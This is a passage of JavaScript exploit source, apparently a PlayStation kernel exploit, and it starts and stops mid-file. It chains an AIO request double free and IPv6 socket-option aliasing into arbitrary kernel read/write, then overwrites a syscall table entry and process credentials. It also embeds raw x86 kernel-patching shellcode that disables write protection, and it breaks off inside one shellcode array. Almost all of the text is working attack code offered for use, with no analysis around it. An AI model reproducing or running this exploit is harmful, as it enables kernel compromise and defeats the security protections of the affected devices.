    die('failed to confuse evf and rthdr');
  }
  set_evf_flags(evf, 0xff << 8);
  get_rthdr(sd, buf, 0x80);
  // fields we use from evf (number before the field is the offset in hex):
  // struct evf:
  //     0 u64 flags
  //     28 struct cv cv
  //     38 TAILQ_HEAD(struct evf_waiter) waiters
  // evf.cv.cv_description = "evf cv"
  // string is located at the kernel's mapped ELF file
  const kernel_addr = buf.read64(0x28);
  //log(`"evf cv" string addr: ${kernel_addr}`);
  // because of TAILQ_INIT(), we have:
  // evf.waiters.tqh_last == &evf.waiters.tqh_first
  // we now know the address of the kernel buffer we are leaking
  const kbuf_addr = buf.read64(0x40).sub(0x38);
  //log(`kernel buffer addr: ${kbuf_addr}`);
  // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
  // allocate reqs1 arrays at 0x100 malloc zone
  const num_elems = 6;
  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
  // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
  // field
  const ucred = kbuf_addr.add(4);
  const leak_reqs = make_reqs1(num_elems);
  const leak_reqs_p = leak_reqs.addr;
  leak_reqs.write64(0x10, ucred);
  const leak_ids_len = num_handles * num_elems;
  const leak_ids = new View4(leak_ids_len);
  const leak_ids_p = leak_ids.addr;
  //log('find aio_entry');
  let reqs2_off = null;
  loop: for (let i = 0; i < num_leaks_kernel; i++) {
    get_rthdr(sd, buf);
    spray_aio(
      num_handles,
      leak_reqs_p,
      num_elems,
      leak_ids_p,
      true,
      AIO_CMD_WRITE
    );
    get_rthdr(sd, buf);
    for (let off = 0x80; off < buf.length; off += 0x80) {
      if (verify_reqs2(buf, off)) {
        reqs2_off = off;
        //log(`found reqs2 at attempt: ${i}`);
        break loop;
      }
    }
    free_aios(leak_ids_p, leak_ids_len);
  }
  if (reqs2_off === null) {
    die('could not leak a reqs2');
  }
  //log(`reqs2 offset: ${hex(reqs2_off)}`);
  get_rthdr(sd, buf);
  const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
  //log('leaked aio_entry:');
  //hexdump(reqs2);
  const reqs1_addr = new Long(reqs2.read64(0x10));
  //log(`reqs1_addr: ${reqs1_addr}`);
  reqs1_addr.lo &= -0x100;
  //log(`reqs1_addr: ${reqs1_addr}`);
  //log('searching target_id');
  let target_id = null;
  let to_cancel_p = null;
  let to_cancel_len = null;
  for (let i = 0; i < leak_ids_len; i += num_elems) {
    aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);
    get_rthdr(sd, buf);
    const state = buf.read32(reqs2_off + 0x38);
    if (state === AIO_STATE_ABORTED) {
      window.log(` - Found target_id at batch: ${i / num_elems}`);
      target_id = new Word(leak_ids[i]);
      leak_ids[i] = 0;
      //log(`target_id: ${hex(target_id)}`);
      const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
      //log('leaked aio_entry:');
      //hexdump(reqs2);
      const start = i + num_elems;
      to_cancel_p = leak_ids.addr_at(start);
      to_cancel_len = leak_ids_len - start;
      break;
    }
  }
  if (target_id === null) {
    die('target_id not found');
  }
  cancel_aios(to_cancel_p, to_cancel_len);
  free_aios2(leak_ids_p, leak_ids_len);
  return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
}
//================================================================================================
// FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE ============================================
//================================================================================================
function make_aliased_pktopts(sds) {
  const tclass = new Word();
  for (let loop = 0; loop < num_alias; loop++) {
    for (let i = 0; i < num_sds; i++) {
      setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    for (let i = 0; i < num_sds; i++) {
      tclass[0] = i;
      ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
    }
    for (let i = 0; i < sds.length; i++) {
      gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
      const marker = tclass[0];
      if (marker !== i) {
        window.log(` - Aliased pktopts at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        //log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        // add pktopts to the new sockets now while new allocs can't
        // use the double freed memory
        for (let i = 0; i < 2; i++) {
          const sd = new_socket();
          ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
          sds.push(sd);
        }
        return pair;
      }
    }
  }
  die('failed to make aliased pktopts');
}
//================================================================================================
// STAGE DOUBLE FREE SceKernelAioRWRequest =======================================================
//================================================================================================
function double_free_reqs1(
  reqs1_addr, kbuf_addr, target_id, evf, sd, sds
) {
  const max_leak_len = (0xff + 1) << 3;
  const buf = new Buffer(max_leak_len);
  const num_elems = max_aio_ids;
  const aio_reqs = make_reqs1(num_elems);
  const aio_reqs_p = aio_reqs.addr;
  const num_batches = 2;
  const aio_ids_len = num_batches * num_elems;
  const aio_ids = new View4(aio_ids_len);
  const aio_ids_p = aio_ids.addr;
  //log('start overwrite rthdr with AIO queue entry loop');
  let aio_not_found = true;
  free_evf(evf);
  for (let i = 0; i < num_clobbers; i++) {
    spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
    if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
      //log(`aliased at attempt: ${i}`);
      aio_not_found = false;
      cancel_aios(aio_ids_p, aio_ids_len);
      break;
    }
    free_aios(aio_ids_p, aio_ids_len);
  }
  if (aio_not_found) {
    die('failed to overwrite rthdr');
  }
  const reqs2 = new Buffer(0x80);
  const rsize = build_rthdr(reqs2, reqs2.size);
  // .ar2_ticket
  reqs2.write32(4, 5);
  // .ar2_info
  reqs2.write64(0x18, reqs1_addr);
  // craft a aio_batch using the end portion of the buffer
  const reqs3_off = 0x28;
  // .ar2_batch
  reqs2.write64(0x20, kbuf_addr.add(reqs3_off));
  // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
  // safe since free_queue_entry() doesn't deref the pointer
  reqs2.write32(reqs3_off, 1);
  reqs2.write32(reqs3_off + 4, 0);
  // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
  reqs2.write32(reqs3_off + 8, AIO_STATE_COMPLETE);
  reqs2[reqs3_off + 0xc] = 0;
  // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
  // safe since the entry already got dequeued
  // .ar3_lock.lock_object.lo_flags = (
  //     LO_SLEEPABLE | LO_UPGRADABLE
  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
  //     | 6 << LO_CLASSSHIFT
  //     | LO_INITIALIZED
  // )
  reqs2.write32(reqs3_off + 0x28, 0x67b0000);
  // .ar3_lock.lk_lock = LK_UNLOCKED
  reqs2.write64(reqs3_off + 0x38, 1);
  const states = new View4(num_elems);
  const states_p = states.addr;
  const addr_cache = [aio_ids_p];
  for (let i = 1; i < num_batches; i++) {
    addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
  }
  //log('start overwrite AIO queue entry with rthdr loop');
  let req_id = null;
  close(sd);
  sd = null;
  loop: for (let i = 0; i < num_alias; i++) {
    for (const sd of sds) {
      set_rthdr(sd, reqs2, rsize);
    }
    for (let batch = 0; batch < addr_cache.length; batch++) {
      states.fill(-1);
      aio_multi_cancel(addr_cache[batch], num_elems, states_p);
      const req_idx = states.indexOf(AIO_STATE_COMPLETE);
      if (req_idx !== -1) {
        //log(`req_idx: ${req_idx}`);
        //log(`found req_id at batch: ${batch}`);
        //log(`states: ${[...states].map(e => hex(e))}`);
        //log(`states[${req_idx}]: ${hex(states[req_idx])}`);
        //log(`aliased at attempt: ${i}`);
        const aio_idx = batch * num_elems + req_idx;
        req_id = new Word(aio_ids[aio_idx]);
        //log(`req_id: ${hex(req_id)}`);
        aio_ids[aio_idx] = 0;
        // set .ar3_done to 1
        poll_aio(req_id, states);
        //log(`states[${req_idx}]: ${hex(states[0])}`);
        for (let i = 0; i < num_sds; i++) {
          const sd2 = sds[i];
          get_rthdr(sd2, reqs2);
          const done = reqs2[reqs3_off + 0xc];
          if (done) {
            //hexdump(reqs2);
            sd = sd2;
            sds.splice(i, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
          }
        }
        if (sd === null) {
          die("can't find sd that overwrote AIO queue entry");
        }
        //log(`sd: ${sd}`);
        break loop;
      }
    }
  }
  if (req_id === null) {
    die('failed to overwrite AIO queue entry');
  }
  free_aios2(aio_ids_p, aio_ids_len);
  // enable deletion of target_id
  poll_aio(target_id, states);
  //log(`target's state: ${hex(states[0])}`);
  const sce_errs = new View4([-1, -1]);
  const target_ids = new View4([req_id, target_id]);
  // PANIC: double free on the 0x100 malloc zone. important kernel data may
  // alias
  aio_multi_delete(target_ids.addr, 2, sce_errs.addr);
  // we reclaim first since the sanity checking here is longer which makes it
  // more likely that we have another process claim the memory
  try {
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    const sd_pair = make_aliased_pktopts(sds);
    return [sd_pair, sd];
  } finally {
    //log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    states[0] = -1;
    states[1] = -1;
    poll_aio(target_ids, states);
    //log(`target states: ${hex(states[0])}, ${hex(states[1])}`);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    let success = true;
    if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
      //log('ERROR: bad delete of corrupt AIO request');
      success = false;
    }
    if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
      //log('ERROR: bad delete of ID pair');
      success = false;
    }
    if (!success) {
      die('ERROR: double free on a 0x100 malloc zone failed');
    }
  }
}
//================================================================================================
// STAGE GET ARBITRARY KERNEL READ/WRITE =========================================================
//================================================================================================
// k100_addr is double freed 0x100 malloc zone address
// dirty_sd is the socket whose rthdr pointer is corrupt
// kernel_addr is the address of the "evf cv" string
function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
  const psd = pktopts_sds[0];
  const tclass = new Word();
  const off_tclass = is_ps4 ? 0xb0 : 0xc0;
  const pktopts = new Buffer(0x100);
  const rsize = build_rthdr(pktopts, pktopts.size);
  const pktinfo_p = k100_addr.add(0x10);
  // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
  pktopts.write64(0x10, pktinfo_p);
  //log('overwrite main pktopts');
  let reclaim_sd = null;
  close(pktopts_sds[1]);
  for (let i = 0; i < num_alias; i++) {
    for (let i = 0; i < num_sds; i++) {
      // if a socket doesn't have a pktopts, setting the rthdr will make
      // one. the new pktopts might reuse the memory instead of the
      // rthdr. make sure the sockets already have a pktopts before
      pktopts.write32(off_tclass, 0x4141 | (i << 16));
      set_rthdr(sds[i], pktopts, rsize);
    }
    gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
    const marker = tclass[0];
    if ((marker & 0xffff) === 0x4141) {
      window.log(` - Found reclaim sd at attempt: ${i}`);
      const idx = marker >>> 16;
      reclaim_sd = sds[idx];
      sds.splice(idx, 1);
      break;
    }
  }
  if (reclaim_sd === null) {
    die('failed to overwrite main pktopts');
  }
  const pktinfo = new Buffer(0x14);
  pktinfo.write64(0, pktinfo_p);
  const nhop = new Word();
  const nhop_p = nhop.addr;
  const read_buf = new Buffer(8);
  const read_buf_p = read_buf.addr;
  function kread64(addr) {
    const len = 8;
    let offset = 0;
    while (offset < len) {
      // pktopts.ip6po_pktinfo = addr + offset
      pktinfo.write64(8, addr.add(offset));
      nhop[0] = len - offset;
      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
      sysi(
        'getsockopt',
        psd, IPPROTO_IPV6, IPV6_NEXTHOP,
        read_buf_p.add(offset), nhop_p
      );
      const n = nhop[0];
      if (n === 0) {
        read_buf[offset] = 0;
        offset += 1;
      } else {
        offset += n;
      }
    }
    return read_buf.read64(0);
  }
  const ka = kread64(kernel_addr);
  //log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
  const kstr = jstr(read_buf);
  //log(`*(&"evf cv"): ${kstr}`);
  if (kstr !== 'evf cv') {
    die('test read of &"evf cv" failed');
  }
  const kbase = kernel_addr.sub(off_kstr);
  //log(`kernel base: ${kbase}`);
  //log('\nmaking arbitrary kernel read/write');
  const cpuid = 7 - main_core;
  const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid * 8);
  //log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
  const pcpu = kread64(pcpu_p);
  //log(`pcpu: ${pcpu}`);
  //log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
  // __pcpu[cpuid].pc_curthread
  const td = kread64(pcpu);
  //log(`td: ${td}`);
  const off_td_proc = 8;
  const proc = kread64(td.add(off_td_proc));
  //log(`proc: ${proc}`);
  const pid = sysi('getpid');
  //log(`our pid: ${pid}`);
  const pid2 = kread64(proc.add(0xb0)).lo;
  //log(`suspected proc pid: ${pid2}`);
  if (pid2 !== pid) {
    die('process not found');
  }
  const off_p_fd = 0x48;
  const p_fd = kread64(proc.add(off_p_fd));
  //log(`proc.p_fd: ${p_fd}`);
  // curthread->td_proc->p_fd->fd_ofiles
  const ofiles = kread64(p_fd);
  //log(`ofiles: ${ofiles}`);
  const off_p_ucred = 0x40;
  const p_ucred = kread64(proc.add(off_p_ucred));
  //log(`p_ucred ${p_ucred}`);
  const pipes = new View4(2);
  sysi('pipe', pipes.addr);
  const pipe_file = kread64(ofiles.add(pipes[0] * 8));
  //log(`pipe file: ${pipe_file}`);
  // ofiles[pipe_fd].f_data
  const kpipe = kread64(pipe_file);
  //log(`pipe pointer: ${kpipe}`);
  const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
  for (let off = 0; off < pipe_save.size; off += 8) {
    pipe_save.write64(off, kread64(kpipe.add(off)));
  }
  const main_sd = psd;
  const worker_sd = dirty_sd;
  const main_file = kread64(ofiles.add(main_sd * 8));
  //log(`main sock file: ${main_file}`);
  // ofiles[sd].f_data
  const main_sock = kread64(main_file);
  //log(`main sock pointer: ${main_sock}`);
  // socket.so_pcb (struct inpcb *)
  const m_pcb = kread64(main_sock.add(0x18));
  //log(`main sock pcb: ${m_pcb}`);
  // inpcb.in6p_outputopts
  const m_pktopts = kread64(m_pcb.add(0x118));
  //log(`main pktopts: ${m_pktopts}`);
  //log(`0x100 malloc zone pointer: ${k100_addr}`);
  if (m_pktopts.ne(k100_addr)) {
    die('main pktopts pointer != leaked pktopts pointer');
  }
  // ofiles[sd].f_data
  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
  //log(`reclaim sock pointer: ${reclaim_sock}`);
  // socket.so_pcb (struct inpcb *)
  const r_pcb = kread64(reclaim_sock.add(0x18));
  //log(`reclaim sock pcb: ${r_pcb}`);
  // inpcb.in6p_outputopts
  const r_pktopts = kread64(r_pcb.add(0x118));
  //log(`reclaim pktopts: ${r_pktopts}`);
  // ofiles[sd].f_data
  const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
  //log(`worker sock pointer: ${worker_sock}`);
  // socket.so_pcb (struct inpcb *)
  const w_pcb = kread64(worker_sock.add(0x18));
  //log(`worker sock pcb: ${w_pcb}`);
  // inpcb.in6p_outputopts
  const w_pktopts = kread64(w_pcb.add(0x118));
  //log(`worker pktopts: ${w_pktopts}`);
  // get restricted read/write with pktopts pair
  // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
  const w_pktinfo = w_pktopts.add(0x10);
  pktinfo.write64(0, w_pktinfo);
  pktinfo.write64(8, 0); // clear .ip6po_nexthop
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  pktinfo.write64(0, kernel_addr);
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  const kstr2 = jstr(pktinfo);
  //log(`*(&"evf cv"): ${kstr2}`);
  if (kstr2 !== 'evf cv') {
    die('pktopts read failed');
  }
  //log('achieved restricted kernel read/write');
  // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
  // using pktopts write. we can safely modify a pipe even with this limit so
  // we corrupt that instead for arbitrary read/write. pipe.pipe_map will be
  // clobbered with zeros but that's okay
  class KernelMemory {
    constructor(main_sd, worker_sd, pipes, pipe_addr) {
      this.main_sd = main_sd;
      this.worker_sd = worker_sd;
      this.rpipe = pipes[0];
      this.wpipe = pipes[1];
      this.pipe_addr = pipe_addr; // &pipe.pipe_buf
      this.pipe_addr2 = pipe_addr.add(0x10); // &pipe.pipe_buf.buffer
      this.rw_buf = new Buffer(0x14);
      this.addr_buf = new Buffer(0x14);
      this.data_buf = new Buffer(0x14);
      this.data_buf.write32(0xc, 0x40000000);
    }
    _verify_len(len) {
      if ((typeof len !== 'number') || !isFinite(len) || (Math.floor(len) !== len) || (len < 0) || (len > 0xffffffff)) {
        throw TypeError('len not a 32-bit unsigned integer');
      }
    }
    copyin(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;
      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write64(0, 0);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, dst);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi('write', this.wpipe, src, len);
    }
    copyout(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;
      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write32(0, 0x40000000);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, src);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi('read', this.rpipe, dst, len);
    }
    _read(addr) {
      const buf = this.rw_buf;
      buf.write64(0, addr);
      buf.fill(0, 8);
      ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
      gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
    }
    read8(addr) {
      this._read(addr);
      return this.rw_buf.read8(0);
    }
    read16(addr) {
      this._read(addr);
      return this.rw_buf.read16(0);
    }
    read32(addr) {
      this._read(addr);
      return this.rw_buf.read32(0);
    }
    read64(addr) {
      this._read(addr);
      return this.rw_buf.read64(0);
    }
    write8(addr, value) {
      this.rw_buf.write8(0, value);
      this.copyin(this.rw_buf.addr, addr, 1);
    }
    write16(addr, value) {
      this.rw_buf.write16(0, value);
      this.copyin(this.rw_buf.addr, addr, 2);
    }
    write32(addr, value) {
      this.rw_buf.write32(0, value);
      this.copyin(this.rw_buf.addr, addr, 4);
    }
    write64(addr, value) {
      this.rw_buf.write64(0, value);
      this.copyin(this.rw_buf.addr, addr, 8);
    }
  }
  const kmem = new KernelMemory(main_sd, worker_sd, pipes, kpipe);
  const kstr3_buf = new Buffer(8);
  kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
  const kstr3 = jstr(kstr3_buf);
  //log(`*(&"evf cv"): ${kstr3}`);
  if (kstr3 !== 'evf cv') {
    die('pipe read failed');
  }
  //log('achieved arbitrary kernel read/write');
  // RESTORE: clean corrupt pointer
  // pktopts.ip6po_rthdr = NULL
  // ABC Patch
  const off_ip6po_rthdr = 0x68;
  const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
  const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
  kmem.write64(r_rthdr_p, 0);
  kmem.write64(w_rthdr_p, 0);
  //log('corrupt pointers cleaned');
  /*
  // REMOVE once restore kernel is ready for production
  // increase the ref counts to prevent deallocation
  kmem.write32(main_sock, kmem.read32(main_sock) + 1);
  kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
  // +2 since we have to take into account the fget_write()'s reference
  kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
  */
  return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
}
//================================================================================================
// FETCH FILE ====================================================================================
//================================================================================================
async function get_patches(url) {
  const response = await fetch(url);
  if (!response.ok) {
    throw Error(`Network response was not OK, status: ${response.status}\n` + `failed to fetch: ${url}`);
  }
  return response.arrayBuffer();
}
//================================================================================================
// STAGE KERNEL PATCH ============================================================================
//================================================================================================
// Using JIT to load our own shellcode code here avoids the need to preform
// some trick toggle the CR0.WP bit. We can just toggle it easily within our
// shellcode.
async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
  if (!is_ps4) {
    throw RangeError('PS5 kernel patching unsupported');
  }
  if ((config_target < 0x600) || (config_target >= 0x1000)) {
    throw RangeError('kernel patching unsupported');
  }
  //log('change sys_aio_submit() to sys_kexec()');
  // sysent[661] is unimplemented so free for use
  const sysent_661 = kbase.add(off_sysent_661);
  //const sy_narg = kmem.read32(sysent_661);
  //const sy_call = kmem.read64(sysent_661.add(8));
  //const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
  // Save tweaks from Al-Azif's source
  const sysent_661_save = new Buffer(0x30); // sizeof syscall
  for (let off = 0; off < sysent_661_save.size; off += 8) {
    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
  }
  //log(`sysent[611] save addr: ${sysent_661_save.addr}`);
  //log("sysent[611] save data:");
  //hexdump(sysent_661_save);
  // .sy_narg = 6
  kmem.write32(sysent_661, 6);
  // .sy_call = gadgets['jmp qword ptr [rsi]']
  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
  // .sy_thrcnt = SY_THR_STATIC
  kmem.write32(sysent_661.add(0x2c), 1);
  //log('set the bits for JIT privs');
  // cr_sceCaps[0] // 0x2000038000000000
  kmem.write64(p_ucred.add(0x60), -1);
  // cr_sceCaps[1] // 0x800000000000ff00
  kmem.write64(p_ucred.add(0x68), -1);
  const kpatch700_bin = new Uint8Array([
    0xB9, 0x82, 0x00, 0x00, 0xC0, 0x48, 0x89, 0xF7, 0x0F, 0x32, 0x48, 0xC1,
    0xE2, 0x20, 0x89, 0xC0, 0x48, 0x09, 0xC2, 0x48, 0x8D, 0x8A, 0x40, 0xFE,
    0xFF, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F,
    0x22, 0xC0, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0xBE, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xB8, 0x90, 0xE9, 0xFF, 0xFF, 0x41, 0xB9, 0xEB, 0x00, 0x00, 0x00,
    0x66, 0x89, 0x81, 0xCE, 0xAC, 0x63, 0x00, 0xB8, 0x90, 0xE9, 0xFF, 0xFF,
    0x41, 0xBA, 0xEB, 0x00, 0x00, 0x00, 0x41, 0xBB, 0xEB, 0x04, 0x00, 0x00,
    0x66, 0x89, 0x81, 0xC1, 0x4E, 0x09, 0x00, 0x48, 0x81, 0xC2, 0xD2, 0xAF,
    0x06, 0x00, 0xB8, 0x90, 0xE9, 0xFF, 0xFF, 0xC6, 0x81, 0xCD, 0x0A, 0x00,
    0x00, 0xEB, 0xC6, 0x81, 0x8D, 0xEF, 0x02, 0x00, 0xEB, 0xC6, 0x81, 0xD1,
    0xEF, 0x02, 0x00, 0xEB, 0xC6, 0x81, 0x4D, 0xF0, 0x02, 0x00, 0xEB, 0xC6,
    0x81, 0x91, 0xF0, 0x02, 0x00, 0xEB, 0xC6, 0x81, 0x3D, 0xF2, 0x02, 0x00,
    0xEB, 0xC6, 0x81, 0xED, 0xF6, 0x02, 0x00, 0xEB, 0xC6, 0x81, 0xBD, 0xF7,
    0x02, 0x00, 0xEB, 0x66, 0x89, 0xB1, 0xEF, 0xB5, 0x63, 0x00, 0xC7, 0x81,
    0x90, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x44, 0x89, 0x81,
    0xC6, 0x04, 0x00, 0x00, 0x66, 0x44, 0x89, 0x89, 0xBD, 0x04, 0x00, 0x00,
    0x66, 0x44, 0x89, 0x91, 0xB9, 0x04, 0x00, 0x00, 0xC6, 0x81, 0x77, 0x7B,
    0x08, 0x00, 0xEB, 0x66, 0x44, 0x89, 0x99, 0x08, 0x4C, 0x26, 0x00, 0x66,
    0x89, 0x81, 0x7B, 0x54, 0x09, 0x00, 0xC7, 0x81, 0x20, 0x2C, 0x2F, 0x00,
    0x48, 0x31, 0xC0, 0xC3, 0xC6, 0x81, 0x36, 0x23, 0x1D, 0x00, 0x37, 0xC6,
    0x81, 0x39, 0x23, 0x1D, 0x00, 0x37, 0xC7, 0x81, 0x70, 0x58, 0x12, 0x01,
    0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x91, 0x78, 0x58, 0x12, 0x01, 0xC7,
    0x81, 0x9C, 0x58, 0x12, 0x01, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x20, 0xC0,
    0x48, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x0F, 0x20, 0xC0,
    0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F, 0x22, 0xC0, 0xB8, 0xEB, 0x07,
    0x00, 0x00, 0xC6, 0x81, 0xB1, 0x1B, 0x4A, 0x00, 0xEB, 0x66, 0x89, 0x81,
    0xEE, 0x1B, 0x4A, 0x00, 0x48, 0xB8, 0x41, 0x83, 0xBF, 0xA0, 0x04, 0x00,
    0x00, 0x00, 0x48, 0x89, 0x81, 0xF7, 0x1B, 0x4A, 0x00, 0xB8, 0x49, 0x8B,
    0xFF, 0xFF, 0xC6, 0x81, 0xFF, 0x1B, 0x4A, 0x00, 0x90, 0xC6, 0x81, 0x08,
    0x1C, 0x4A, 0x00, 0x87, 0xC6, 0x81, 0x15, 0x1C, 0x4A, 0x00, 0xB7, 0xC6,
    0x81, 0x2D, 0x1C, 0x4A, 0x00, 0x87, 0xC6, 0x81, 0x3A, 0x1C, 0x4A, 0x00,
    0xB7, 0xC6, 0x81, 0x52, 0x1C, 0x4A, 0x00, 0xBF, 0xC6, 0x81, 0x5E, 0x1C,
    0x4A, 0x00, 0xBF, 0xC6, 0x81, 0x6A, 0x1C, 0x4A, 0x00, 0xBF, 0xC6, 0x81,
    0x76, 0x1C, 0x4A, 0x00, 0xBF, 0x66, 0x89, 0x81, 0x85, 0x1C, 0x4A, 0x00,
    0xC6, 0x81, 0x87, 0x1C, 0x4A, 0x00, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x0D,
    0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x48, 0x8B, 0x57, 0x08, 0x48,
    0x8B, 0x47, 0x10, 0x48, 0x89, 0xD6, 0x4C, 0x8D, 0x40, 0x01, 0x4C, 0x29,
    0xC6, 0x48, 0x83, 0xFE, 0x0E, 0x76, 0x6D, 0xF3, 0x0F, 0x6F, 0x00, 0x0F,
    0x11, 0x02, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x42, 0x10, 0x48, 0x8B,
    0x47, 0x18, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47,
    0x20, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x28,
    0x48, 0x8B, 0x10, 0x48, 0x89, 0x91, 0x50, 0xD2, 0x12, 0x01, 0x48, 0x8B,
    0x50, 0x08, 0x48, 0x89, 0x91, 0x58, 0xD2, 0x12, 0x01, 0x48, 0x8B, 0x50,
    0x10, 0x48, 0x89, 0x91, 0x60, 0xD2, 0x12, 0x01, 0x48, 0x8B, 0x50, 0x18,
    0x48, 0x89, 0x91, 0x68, 0xD2, 0x12, 0x01, 0x48, 0x8B, 0x50, 0x20, 0x48,
    0x89, 0x91, 0x70, 0xD2, 0x12, 0x01, 0x48, 0x8B, 0x40, 0x28, 0x48, 0x89,
    0x81, 0x78, 0xD2, 0x12, 0x01, 0x31, 0xC0, 0xC3, 0x4C, 0x8D, 0x40, 0x18,
    0x48, 0x29, 0xC2, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0xB6, 0x30, 0x40, 0x88, 0x34, 0x02, 0x48, 0x83, 0xC0, 0x01, 0x49,
    0x39, 0xC0, 0x75, 0xF0, 0xEB, 0x80
  ]);
  const kpatch750_bin = new Uint8Array([
    0xB9, 0x82, 0x00, 0x00, 0xC0, 0x48, 0x89, 0xF7, 0x0F, 0x32, 0x48, 0xC1,
    0xE2, 0x20, 0x89, 0xC0, 0x48, 0x09, 0xC2, 0x48, 0x8D, 0x8A, 0x40, 0xFE,
    0xFF, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F,
    0x22, 0xC0, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0xBE, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xB8, 0x90, 0xE9, 0xFF, 0xFF, 0x41, 0xB9, 0xEB, 0x00, 0x00, 0x00,
    0x66, 0x89, 0x81, 0x94, 0x73, 0x63, 0x00, 0xB8, 0x90, 0xE9, 0xFF, 0xFF,
